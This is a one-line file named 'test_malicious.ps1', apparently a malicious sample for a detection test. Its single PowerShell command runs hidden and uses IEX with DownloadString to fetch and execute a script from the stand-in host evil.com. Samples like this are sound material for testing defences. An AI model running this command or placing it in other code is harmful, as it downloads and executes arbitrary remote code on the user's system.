# test_malicious.ps1
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
